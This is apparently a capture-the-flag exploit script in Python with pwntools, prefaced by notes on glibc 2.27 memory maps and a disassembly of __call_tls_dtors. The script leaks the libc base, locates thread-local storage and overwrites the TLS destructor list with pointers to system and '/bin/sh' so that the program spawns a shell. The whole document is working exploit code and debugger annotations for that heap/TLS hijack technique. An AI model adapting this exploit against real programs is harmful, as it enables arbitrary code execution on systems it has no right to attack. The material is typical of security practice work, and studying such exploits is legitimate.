'''
new version of 2.27's libc.so.6

0x00007fa5cd644000 0x00007fa5cd66d000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.27.so
0x00007fa5cd866000 0x00007fa5cd868000 0x0000000000000000 rw-                                    <- use this section
0x00007fa5cd86d000 0x00007fa5cd86e000 0x0000000000029000 r-- /lib/x86_64-linux-gnu/ld-2.27.so
0x00007fa5cd86e000 0x00007fa5cd86f000 0x000000000002a000 rw- /lib/x86_64-linux-gnu/ld-2.27.so

   0x00007f4b6e0c9990 <+0>:     push   rbp
   0x00007f4b6e0c9991 <+1>:     push   rbx
   0x00007f4b6e0c9992 <+2>:     sub    rsp,0x8
   0x00007f4b6e0c9996 <+6>:     mov    rbp,QWORD PTR [rip+0x3a73c3]        # 0x7f4b6e470d60
   0x00007f4b6e0c999d <+13>:    mov    rbx,QWORD PTR fs:[rbp+0x0]
   0x00007f4b6e0c99a2 <+18>:    test   rbx,rbx
   0x00007f4b6e0c99a5 <+21>:    je     0x7f4b6e0c99ee <__GI___call_tls_dtors+94>
   0x00007f4b6e0c99a7 <+23>:    nop    WORD PTR [rax+rax*1+0x0]
   0x00007f4b6e0c99b0 <+32>:    mov    rdx,QWORD PTR [rbx+0x18]
   0x00007f4b6e0c99b4 <+36>:    mov    rax,QWORD PTR [rbx]                 # rax = 0
   0x00007f4b6e0c99b7 <+39>:    mov    rdi,QWORD PTR [rbx+0x8]             # rdi = sh addr
   0x00007f4b6e0c99bb <+43>:    ror    rax,0x11                            
   0x00007f4b6e0c99bf <+47>:    xor    rax,QWORD PTR fs:0x30               # rax = system
   0x00007f4b6e0c99c8 <+56>:    mov    QWORD PTR fs:[rbp+0x0],rdx
=> 0x00007f4b6e0c99cd <+61>:    call   rax


can control rdi rdx rbx rax rip


'''


from pwn import *

context.arch = 'amd64'
#context.terminal = ['tmux', 'neww']

libc = ELF('./libc.so.6')


r = process('simple')

r.recvuntil('@')
libc_base = int(r.recvline().strip(), 16) - libc.symbols['exit']
tls = libc_base + 0x613000
print("libc_base @ ", hex(libc_base))
print("tls @ ", hex(tls))

gdb.attach(r, 'b __call_tls_dtors\nc\nsi 5')
r.sendlineafter('addr:', str(tls))
system = libc_base + libc.symbols['system']
sh = libc_base + libc.search('/bin/sh').next()

########################### [rbx]  ###### rdi ########  rbx     #### rax ########
r.sendlineafter('content:', p64(0)+p64(sh)*(0x1460//8)+p64(tls)+p64(system)*0x100)

r.interactive()
